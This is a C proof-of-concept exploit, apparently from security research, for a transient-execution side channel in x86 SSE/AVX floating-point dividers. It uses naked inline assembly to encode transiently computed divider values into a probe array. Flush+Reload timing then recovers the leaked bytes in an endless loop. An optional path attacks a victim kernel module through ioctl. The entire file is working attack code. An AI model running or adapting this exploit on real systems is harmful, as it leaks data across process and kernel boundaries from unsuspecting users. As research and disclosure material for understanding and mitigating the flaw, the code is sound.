#define _GNU_SOURCE
#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/prctl.h>
#include <x86intrin.h>
#include <immintrin.h>

// attack SSE divisions
#define EXPLOIT_SSE_DIVIDER

// attack AVX divisions
//#define EXPLOIT_AVX_DIVIDER

//#define SLOWMODE

// comment in to call into the victim kernel module
// Note: kernel module must be loaded
//#define VICTIM_KERNEL

#include "cacheutils.h"

#ifdef VICTIM_KERNEL
#include "./victim-kmod/dss-victim.h"

int victim_kmod_fd = -1;
#endif

#define ITERATIONS 100
#define REPEAT_EXPERIMENT 1000
#define SPACING 4096
#define LEAKAGE_RUNS_PER_TEST_EXEC 100

__attribute__((aligned(4096)))
char probe_memory[256 * 4096];

__attribute__((aligned(4096)))
char data_page[256 * 4096];

__attribute__((aligned(4096)))
char data_page_second_mapping[4096];

void amd_clear_divider() {
    // mitigation from the linux kernel codebase
  	asm volatile("div %2\n\t" :: "a" (0), "d" (0), "r" (1));
}

__attribute__((naked, aligned(4096)))
void attacker_code(
    char* data_page, 
    char* data_page_second_mapping, 
    char* probe_memory,
    uint64_t offset) {
    // args:
    // rdi: data_page
    // rsi: data_page_second_mapping
    // rdx: probe_memory
    // rcx: offset
  asm volatile(INTELASM(
        "push   rbx\n\t"
        "push   rbp\n\t"
        "mov    rbp, rsp\n\t"
        "mov r11, rdx\n\t"

        "mov rdi, 0x1\n\t"
        "movq   xmm1, rdi\n\t"

        "mov rdi, 0x1\n\t"
        "movq   xmm2, rdi\n\t"

#ifdef EXPLOIT_SSE_DIVIDER
        "divsd  xmm1, xmm2\n\t"
#endif
#ifdef EXPLOIT_AVX_DIVIDER
        "vdivss  xmm1, xmm1, xmm2\n\t"
#endif
        //"lfence\n\t"

        "movq   rax, xmm1\n\t"
        // leak >> offset
        "shr    rax, cl\n\t"

        // (leak & 0xff) << 12
        "and rax, 0xff\n\t"
        "shl    rax, 12\n\t"

        // encode leak in page-aligned covert channel
        "add    r11, rax\n\t"
        "mov    rdx, QWORD PTR [r11]\n\t"
        "mov    rsp, rbp\n\t"
        "pop    rbp\n\t"
        "pop    rbx\n\t"
        "ret\n\t"

  ));
}


void init() {
  // touch memory to make sure its mapped
  memset(probe_memory, 'P', sizeof(probe_memory));
  memset(data_page, 'D', sizeof(data_page));
  memset(data_page_second_mapping, 'D', sizeof(data_page_second_mapping));

  CACHE_MISS = detect_flush_reload_threshold() + 10;
  printf("Cache miss @ %zd\n", CACHE_MISS);

#ifdef VICTIM_KERNEL
  victim_kmod_fd = open(MODULE_DEVICE_PATH, O_RDONLY);
  if (victim_kmod_fd < 0) {
    fprintf(stderr, "Error: Could not open victim module: %s\n", MODULE_DEVICE_PATH);
    exit(1);
  }
#endif

  for (size_t i = 0; i < 256; i++) {
    flush(probe_memory + i * SPACING);
  }
  mfence();
}

void execute_leak() {
  int hits[256] = {0};

  for (ssize_t byte_offset = 7; byte_offset >= 0; byte_offset--) {
    printf(" ");
    memset(hits, 0, sizeof(hits));
    uint64_t asm_offset = byte_offset * 8;

    for (size_t iter = 0; iter < ITERATIONS; iter++) {

      // make sure probe_memory is in the TLB
      maccess(probe_memory + (4096 - 64));
      mfence();
    
      for (volatile size_t leakage_runs = 0;
          leakage_runs < LEAKAGE_RUNS_PER_TEST_EXEC;
          leakage_runs++) {
          
#ifdef VICTIM_KERNEL
    //size_t val = 0x4141414141414141;
    size_t val = 0x4b4b4b4b4b4b4b4b;
    ioctl(victim_kmod_fd, 0x0, (unsigned long)&val);
    amd_clear_divider();
#endif

        if (!setjmp(trycatch_buf)) {
          attacker_code(
              data_page + 0x80,
              data_page_second_mapping + 0x80,
              probe_memory,
              asm_offset);
        }
      }
    
      mfence();
      for (size_t i = 0; i < 256; i++) {
          size_t idx = ((i * 167u) + 13u) & 255u;
          size_t delta = flush_reload_t(probe_memory + idx * SPACING);
          if (delta < CACHE_MISS) {
            hits[idx]++;
          }
      }
    }
  
    int found_hit = 0;

    int best_hit_cnt = -1;
    int best_hit_idx = 0xfffffffff;
    for (size_t i = 0; i < 256; i++) {
      if (hits[i] > 0) {
        int hit_cnt = hits[i];

        // we artificially bias us towards reducing the architectural hits
        // while still keeping them as best guesses if we can't recover smth else
        // in case the transient and arch values are the same
#ifdef EXPLOIT_SSE_DIVIDER
        if (byte_offset == 0 && i == 0x00)  hit_cnt = 0;
        if (byte_offset == 1 && i == 0x00)  hit_cnt = 0;
        if (byte_offset == 2 && i == 0x00)  hit_cnt = 0;
        if (byte_offset == 3 && i == 0x00)  hit_cnt = 0;
        if (byte_offset == 4 && i == 0x00)  hit_cnt = 0;
        if (byte_offset == 5 && i == 0x00)  hit_cnt = 0;
        if (byte_offset == 6 && i == 0xf0) hit_cnt = 0;
        if (byte_offset == 7 && i == 0x3f) hit_cnt = 0;
#endif
#ifdef EXPLOIT_AVX_DIVIDER
        if (byte_offset == 0 && i == 0x00)  hit_cnt = 0;
        if (byte_offset == 1 && i == 0x00)  hit_cnt = 0;
        if (byte_offset == 2 && i == 0x00)  hit_cnt = 0;
        if (byte_offset == 3 && i == 0x00)  hit_cnt = 0;
        if (byte_offset == 4 && i == 0x3f)  hit_cnt = 0;
        if (byte_offset == 5 && i == 0x80)  hit_cnt = 0;
        if (byte_offset == 6 && i == 0x00) hit_cnt = 0;
        if (byte_offset == 7 && i == 0x00) hit_cnt = 0;
#endif

        if (best_hit_cnt < hit_cnt) {
          best_hit_cnt = hit_cnt;
          best_hit_idx = i;
        }
      }
    } 
    if (best_hit_idx == -1) {
      printf("?");
    } else {
      printf("%02x", best_hit_idx);
    } 
  } // for (size_t byte_offset = 0; byte_offset < 4; byte_offset++)
  printf("\n");
#ifdef SLOWMODE
  sleep(1);
#endif
}

int main(int argc, char* argv[]) {
  init();

  printf("--------------------\n");
  while (1) {
    execute_leak();
  }

}
